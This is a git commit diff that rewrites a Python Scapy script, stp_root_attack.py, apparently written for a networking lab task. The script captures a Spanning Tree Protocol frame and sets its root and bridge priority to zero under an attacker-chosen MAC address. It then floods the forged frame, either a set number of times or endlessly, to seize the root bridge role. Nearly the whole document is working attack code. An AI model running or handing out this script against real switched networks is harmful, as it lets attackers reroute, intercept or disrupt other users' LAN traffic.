267b30205caa2f5e4d6c3b527325d02461da8036
Shahmizan <71887108+2000726@users.noreply.github.com>
2021-10-22 18:16:15 +0800

    Update stp_root_attack.py

--- task2/stp_root_attack.py
+++ task2/stp_root_attack.py
@@ -1,67 +1,56 @@
-
 from scapy.all import *
+import time
 from argparse import ArgumentParser
 
+
 def main():
+    
+    # Defining the arguments
     parser = ArgumentParser()
-    parser.add_argument('--src-mac', '-src', help='Source MAC address')
-    parser.add_argument('--dest-mac', '-dest', help='destinition MAC address')
-    parser.add_argument('--root-mac', '-rt', help='root MAC address')
-    parser.add_argument('--bridge-mac', '-bg', help='bridge MAC address')
-    parser.add_argument('--count', '-c', help='number of frames to be sent')
-    parser.epilog = "Usage: py stp_root_attack.py -src 01:80:c2:00:00:00 -dest 01:80:c2:00:00:00 -rt 01:80:c2:00:00:00 -bg 01:80:c2:00:00:00 -c 50"
+    parser.add_argument('--rogue-mac', '-r', help='Rogue MAC Address')
+    parser.add_argument('--count', '-c', help='Count of frames to send')
+    parser.epilog = "Usage: python stp_root_attack.py -r 00:00:00:00:00:01 -c 50"
     
     args = parser.parse_args()
-    if args.src_mac is not None:
-        if args.dest_mac is not None:
-            if args.root_mac is not None:
-                if args.bridge_mac is not None:
-                    count = 0
-                    if args.count is None:
-                        print("You didn't set count using -c flag so it is set to 50 by default")
-                        count = 50
-                    else:
-                        count = int(args.count)
-                    #Capture STP frame
-                    pkt = sniff(filter=f"ether dst {args.dest_mac}",count=1)    
-                    #Change the MAC address in the frame to the following:
-                    pkt[0].src=args.src_mac
-                    #Set Rootid
-                    pkt[0].rootid=0
-                    #Set rootmac
-                    pkt[0].rootmac=args.root_mac
-                    #Set Bridgeid
-                    pkt[0].bridgeid=0  
-                    #Set rootmac
-                    pkt[0].bridgemac=args.bridge_mac
-                    #Show changed frame
-                    pkt[0].show()
-                    #Loop to send multiple frames into the network:
-                    for i in range (0, count):
-                        #Send changed frame back into the network:
-                        sendp(pkt[0], loop=0, verbose=1)
-                        #Sleep / wait for one second:
-                        time.sleep(1)
-                else:
-                    print('[-]Please, use --bridge-mac or -bg to set a Bridge MAC Address!')
-                    print('[!]Example: -bg 01:80:c2:00:00:00')
-                    print('[?] -h for help')
-                    sys.exit(1)
-            else:
-                print('[-]Please, use --root-mac or -rt to set a Root MAC Address!')
-                print('[!]Example: -rt 01:80:c2:00:00:00')
-                print('[?] -h for help')
-                sys.exit(1)
+    
+    #print(args)
+    
+    if args.rogue_mac is not None:
+        
+        # Capture the STP frame
+        packet = sniff(filter="ether dst 01:80:c2:00:00:00", count=1)   # STP uses this well known MAC Address 
+        print("*************** Original Packet ***************")
+        packet[0].show()
+        
+        # Modify the STP frame to be malicious
+        packet[0].src = args.rogue_mac
+        packet[0].rootid = 0                    # Specify a low Root ID (highest priority)
+        packet[0].rootmac = args.rogue_mac
+        packet[0].bridgeid = 0                  # Specify a low Root ID (highest priority)
+        packet[0].bridgemac = args.rogue_mac
+        print("--------------- Modified Packet ---------------")
+        packet[0].show()
+        
+        # Loop to continuously send the frame, ensuring the root switch isn't taken over:                
+        # Defining the amount of times to send the malicious STP frame
+        print("Transmitting malicious STP frames now")
+        
+        count = 0
+        
+        if args.count is not None:
+            count = int(args.count)
+            for i in range(0, count):
+                sendp(packet[0], loop=0, verbose=1)
+                time.sleep(1)
         else:
-            print('[-]Please, use --dest-mac or -dest to set a Destinition MAC Address!')
-            print('[!]Example: -dest 01:80:c2:00:00:00')
-            print('[?] -h for help')
-            sys.exit(1)
+            sendp(packet[0], loop=1, verbose=1)
+    
+        sys.exit(0)
+        
     else:
-        print('[-]Please, use --src-mac or -src to set a source MAC Address!')
-        print('[!]Example: -src 01:80:c2:00:00:00')
+        print('[-]Please, use --rogue-mac or -r to set the Rogue MAC Address!')
+        print('[!]Example: -r 00:00:00:00:00:12')
         print('[?] -h for help')
         sys.exit(1)
-
+        
 main()
-sys.exit(0)
